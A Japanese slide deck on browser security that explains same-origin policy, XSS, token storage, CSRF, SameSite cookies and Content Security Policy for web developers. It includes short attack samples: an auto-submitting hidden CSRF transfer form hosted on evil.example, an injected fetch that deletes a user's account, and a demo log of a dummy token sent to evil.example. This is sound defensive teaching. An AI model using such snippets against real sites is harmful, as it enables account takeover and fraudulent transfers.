---
layout: section
routeAlias: browser
---

<div class="section-num">01</div>

# ブラウザの仕組み

<div class="section-sub">XSSが攻撃者に何を与えるのか、そしてブラウザ自身の防御</div>

---

# オリジンがブラウザの境界

<MdnLink path="Web/Security/Defenses/Same-origin_policy">同一オリジンポリシー：あるオリジンは他のオリジンのデータを読めない</MdnLink>

<div class="origin-url"><span class="k">https://</span><span class="t">shop.example</span><span class="v">:443</span><span class="muted">/cart</span></div>
<div class="origin-labels"><span class="k">プロトコル</span><span class="t">ホスト</span><span class="v">ポート</span><span class="muted">パス（オリジンには含まれない）</span></div>

| `https://shop.example`と比べて | 同一オリジン？ |
|---|---|
| `https://shop.example/account` | <lucide-check class="ok" /> はい：パスが違うだけ |
| `http://shop.example` | <lucide-x class="ng" /> いいえ：プロトコルが違う |
| `https://api.shop.example` | <lucide-x class="ng" /> いいえ：ホストが違う |
| `https://shop.example:8443` | <lucide-x class="ng" /> いいえ：ポートが違う |

<div class="punch">同じオリジンの中では、すべてのスクリプトが同じ権限を持つ</div>

<style>
.origin-url { font-family: var(--slidev-code-font-family, monospace); font-size: 1.6rem; text-align: center; margin-top: 0.8rem; }
.origin-labels { display: flex; justify-content: center; gap: 1.5rem; font-size: 0.75rem; margin-bottom: 0.6rem; }
.origin-url .k, .origin-labels .k { color: var(--cyan); }
.origin-url .t, .origin-labels .t { color: var(--pink); }
.origin-url .v, .origin-labels .v { color: var(--purple); }
.origin-url .muted, .origin-labels .muted { color: var(--comment); }
</style>

---

# XSS：あなたのオリジンの中で動く他人のコード

<MdnLink path="Web/Security/Attacks/XSS">クロスサイトスクリプティング：悪意あるコードが「サイトの一部であるかのように」実行される</MdnLink>

<div class="cols xss-types">
<div class="card">
<div class="col-h"><lucide-database /> 蓄積型</div>
DBに保存され（投稿やコメント）、すべての訪問者に配信される
</div>
<div class="card">
<div class="col-h"><lucide-link /> 反射型</div>
被害者がクリックする細工されたリンク。サーバーが<code>?q=&lt;script&gt;…</code>をそのままページに書き出す
</div>
<div class="card">
<div class="col-h"><lucide-code /> DOM型</div>
自分のJSが、URLや<code>postMessage</code>のデータをDOMに書き込む
</div>
</div>

<div class="col-h ng xss-can"><lucide-skull /> 入り込んだら、できること</div>

<div class="xss-list">

- **ストレージを読む**：`localStorage`内のトークン
- **ユーザーになりすます**：`fetch`がそのCookieを送る
- **ページを書き換える**：偽のログインフォーム
- **ユーザーを監視する**：キー入力、フォームの入力内容

</div>

<div v-click class="punch">自分のコードにできることは何でも：ユーザーのセッションが他人の手に渡る</div>

<div class="source"><lucide-link /><a href="https://owasp.org/www-community/Types_of_Cross-Site_Scripting" target="_blank">OWASP：XSSの種類</a></div>

<style>
.xss-types { align-items: stretch; margin-top: 1.1rem; }
.xss-types .card { font-size: 0.85rem; line-height: 1.4; }
.xss-can { margin-top: 1.2rem; font-size: 1rem; }
.xss-list ul { columns: 2; column-gap: 2rem; margin-top: 0.3rem; }
.xss-list li { break-inside: avoid; }
</style>

---

# トークンはどこに置くべきか

<MdnLink path="Web/HTTP/Reference/Headers/Set-Cookie">Set-Cookie：HttpOnly属性</MdnLink>

<div class="cols">
<div class="card">
<div class="col-h ng"><lucide-x /> localStorage</div>

```js
localStorage.setItem('token', jwt)
```

- **盗まれる**：ページ上のどのスクリプトも読める（注入されたものも）。有効期限まで攻撃者のマシンからでも使える

</div>
<div class="card lit">
<div class="col-h ok"><lucide-check /> HttpOnly Cookie</div>

```http
Set-Cookie: session=…; HttpOnly; Secure
```

- **読み取れない**：`document.cookie`からは見えない。ただし`fetch`は送信する

</div>
</div>

<div v-click class="misuse">
<div class="col-h ng"><lucide-triangle-alert /> それでも、注入されたスクリプトは<i>使う</i>ことはできる</div>

```js
// Cookieは読めないが、ブラウザが自動で付けてくれる
fetch('/api/account', {
  method: 'DELETE', // ユーザーになりすまして、そのアカウントを削除
})
```

<div class="note"><b>盗用</b>：どこからでも、有効期限まで使える。<b>悪用</b>：あなたのAPIを通してのみ、ユーザーのタブが開いている間だけ。<code>HttpOnly</code>は盗用は防ぐが、悪用は防げない</div>
</div>

<div class="source"><lucide-link /><a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage" target="_blank">OWASP：「セッション識別子をローカルストレージに保存しない」</a></div>

<style>
.cols { margin-top: 1.1rem; }
.misuse { margin-top: 0.8rem; }
.misuse .col-h { margin-bottom: 0.3rem; }
</style>

---

# CSRF：攻撃の仕組み

<MdnLink path="Web/Security/Attacks/CSRF">クロスサイトリクエストフォージェリ：別のサイトがリクエストを送り、ブラウザがCookieを付ける</MdnLink>

<div class="cols middle">
<div>

<div class="csrf-steps">
<v-clicks>

1. **ログインする**：bank.exampleがセッションCookieをセットする
2. **ログインしたまま、evil.exampleを訪れる**：メール、広告、どんなリンクからでも
3. **そこからbank.exampleへリクエストが飛ぶ**：隠しフォームが自動で送信される
4. **ブラウザがCookieを付ける**：Cookie側で禁じていない限り（次のスライド）
5. **銀行には正規のセッションに見える**：送金が通ってしまう

</v-clicks>
</div>

</div>
<div>

<div class="where"><lucide-skull /> evil.example</div>

<div class="small-code">

```html
<form action="https://bank.example/transfer"
      method="POST">
  <input type="hidden" name="to" value="attacker" />
</form>
<script>document.forms[0].submit()</script>
```

</div>
</div>
</div>

<div v-click class="punch">攻撃者はCookieを見ない：ブラウザに使わせる</div>

<style>
.csrf-steps { margin-top: 1.2rem; }
.csrf-steps li { font-size: 0.95rem; line-height: 1.45; margin: 0.7rem 0; }
</style>

---

# セッションCookie：安全でない設定と安全な設定

<div class="sub">ログイン時にbank.exampleのサーバーがセットする。Next.jsならServer FunctionやRoute Handler</div>

<div class="cols cookie-cmp">
<div class="card">
<div class="col-h ng"><lucide-x /> 安全でない</div>

```ts
const cookieStore = await cookies() // next/headers
cookieStore.set('session', id,
  { sameSite: 'none', secure: true })
```

- **どのサイトからでも送られる**：`sameSite: 'none'`のため
- **どのスクリプトからも読める**：`httpOnly`がない

</div>
<div class="card lit" v-click>
<div class="col-h ok"><lucide-check /> 安全</div>

```ts
const cookieStore = await cookies() // next/headers
cookieStore.set('session', id,
  { sameSite: 'lax', secure: true, httpOnly: true })
```

- **他サイトからのPOSTでは送られない**：`sameSite: 'lax'`
- **HTTPSでのみ送られる**：`secure`
- **JavaScriptから見えない**：`httpOnly`

</div>
</div>

<div class="atk" v-click>

| evil.exampleからの攻撃 | 安全でない | 安全 |
|---|---|---|
| 隠しフォームのPOST | <lucide-triangle-alert class="ng" /> Cookieが送られる | <lucide-shield-check class="ok" /> 送られない |
| GET遷移：`location = '…/transfer?to=attacker'` | <lucide-triangle-alert class="ng" /> Cookieが送られる | <lucide-triangle-alert class="ng" /> それでも送られる |

</div>

<div class="punch" v-click>LaxはPOSTは防ぐが、GETは防がない：GETでデータを変更しない</div>

<div class="source"><lucide-link /><a href="https://developer.mozilla.org/ja/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value" target="_blank">MDN：Set-Cookie、SameSite</a> · <a href="https://developer.mozilla.org/ja/docs/Glossary/Site" target="_blank">MDN：Site</a> · <a href="https://nextjs.org/docs/app/api-reference/functions/cookies" target="_blank">Next.js：cookies</a></div>

<style>
.cookie-cmp { margin-top: 0.3rem; }
.cookie-cmp .card { padding: 0.4rem 0.9rem; }
.cookie-cmp .col-h { margin-bottom: 0.2rem; }
.cookie-cmp .slidev-code-wrapper, .cookie-cmp pre { margin: 0.2rem 0 !important; }
.cookie-cmp .slidev-code { font-size: 0.7rem !important; line-height: 1.4 !important; }
.atk { margin: 1rem 0 0; }
.atk table { font-size: 0.8rem; margin: 0; }
.cookie-cmp ~ .punch { margin-top: 1.2rem; }
.atk table th, .atk table td { padding: 0.2rem 0.6rem !important; }
</style>

<!-- 時間があれば口頭で：StrictにするとGETも防げるが、他サイトからのリンクはログアウト状態で届く。SameSiteはオリジンではなくサイト単位なので、*.bank.exampleのサブドメインは同じサイト扱いでCookieが付く。 -->


---

# どのスクリプトを動かすかをブラウザに伝える <span class="badge" style="--c: var(--green)">防御</span>

<MdnLink path="Web/HTTP/Guides/CSP">Content Security Policy（CSP）：サーバーが送るレスポンスヘッダー</MdnLink>

- **デフォルトではポリシーなし**：ヘッダーがなければ、ページ上のすべてのスクリプトが動く
- **'self'**：自分のオリジンのスクリプトファイルのみ。インラインの`<script>`や`onerror=`はブロックされる
- **'unsafe-inline'**：インラインコードを再び許可し、この防御を無効にする
- **ページ単位で、注入されたコードは無効にできない**：すべてのHTMLレスポンスで送る

```http
Content-Security-Policy: default-src 'self'
```

<div class="note">最近のフレームワークでは、インラインスクリプトを全面的に禁止するとフレームワーク自身のハイドレーションが壊れる：実務的には、リクエストごとのnonceと<code>'strict-dynamic'</code>を使う</div>

<div class="punch">予備の防御：エスケープが破られても、ブラウザが実行を拒む</div>

<div class="source"><lucide-link /><a href="https://web.dev/articles/strict-csp?hl=ja" target="_blank">web.dev：strict CSP（nonce + strict-dynamic）</a></div>

---

# 再現：フックとCSP <span class="badge" style="--c: var(--red)">デモ</span>

<div class="sub">フックの投稿を2回：そのまま、そしてページにポリシーを付けて</div>

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

<div class="cols">
<div>

<div class="col-h ng"><lucide-x /> CSPなし</div>

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ng">GET https://evil.example/?t=demo-token-not-a-secret</div>
<div class="dt-row">(failed) net::ERR_NAME_NOT_RESOLVED</div>
</div>

</div>
<div>

<div class="col-h ok"><lucide-check /> default-src 'self'</div>

<div class="devtools">
<div class="dt-h">DevTools → Console</div>
<div class="dt-row ok">Executing inline event handler violates the following Content Security Policy directive 'default-src 'self''. … The action has been blocked.</div>
</div>

</div>
</div>

<div class="pills"><DemoLink href="demos/hook.html">CSPなし</DemoLink><DemoLink href="demos/csp.html">CSPあり</DemoLink></div>

<div class="note">ポリシーは<code>&lt;meta&gt;</code>タグで：静的なデモページにはヘッダーを送るサーバーがない</div>

<div class="foot"><lucide-flask-conical /> デモページはダミーのトークンを<b>evil.example</b>（名前解決されない予約ドメイン）に送る。ブラウザの外には何も出ない</div>

---
routeAlias: browser-layers
---

# 3層の防御

<div class="sub">各層は、その上の層が破られたと想定する</div>

<div class="cols layers-wrap">
<div class="layers">
  <div class="layer">
    <div class="num">1</div>
    <div class="body"><b>他人のコードを入れない</b><small>エスケープ、サニタイズ：次のセクション</small></div>
    <span class="badge" style="--c: var(--green)">予防</span>
  </div>
  <div class="fail"><lucide-arrow-down /> それでもコードがページに入ってしまう</div>
  <div class="layer">
    <div class="num">2</div>
    <div class="body"><b>実行させない</b><small>CSP <code>script-src</code>：許可したスクリプトのみ、インラインコードなし</small></div>
    <span class="badge" style="--c: var(--cyan)">予備</span>
  </div>
  <div class="fail"><lucide-arrow-down /> それでも実行される：<code>'unsafe-inline'</code>、ヘッダーのないページ</div>
  <div class="layer">
    <div class="num">3</div>
    <div class="body"><b>奪えるものを減らす</b><small>トークンは<code>HttpOnly</code>Cookieに。CSP <code>connect-src</code></small></div>
    <span class="badge" style="--c: var(--orange)">被害の抑制</span>
  </div>
</div>
<div class="card side">
<div class="col-h"><lucide-split /> 別の経路：CSRF</div>

注入コードなし：別のサイトがあなたのCookie付きでリクエストを送る

- **セッションCookie**：`SameSite=Lax`
- **APIの設計**：`GET`でデータを変更しない

</div>
</div>

<div class="punch">1つの層に頼らない：各層が上の層の取りこぼしを拾う</div>

<div class="bridge">層1はReactがある程度やってくれる部分 → <b>危険なコード</b></div>

<style>
.layers-wrap { margin-top: 0.5rem; align-items: center; }
.layers-wrap > .layers { flex: 1.8 1 0; }
.layer { display: flex; align-items: center; gap: 0.9rem; padding: 0.55rem 0.9rem; border: 1px solid var(--border); border-radius: 0.6rem; background: var(--background); }
.layer .num { flex: 0 0 auto; width: 1.8rem; height: 1.8rem; border-radius: 50%; display: grid; place-items: center; font-weight: bold; color: var(--background); background: var(--purple); }
.layer .body { flex: 1 1 auto; }
.layer .body b { display: block; color: var(--foreground); }
.layer .body small { color: var(--comment); font-size: 0.75rem; }
.layer .badge { flex: 0 0 auto; }
.fail { display: flex; align-items: center; gap: 0.4rem; margin: 0.25rem 0 0.25rem 1.2rem; font-size: 0.72rem; color: var(--red); }
.side { font-size: 0.8rem; }
</style>
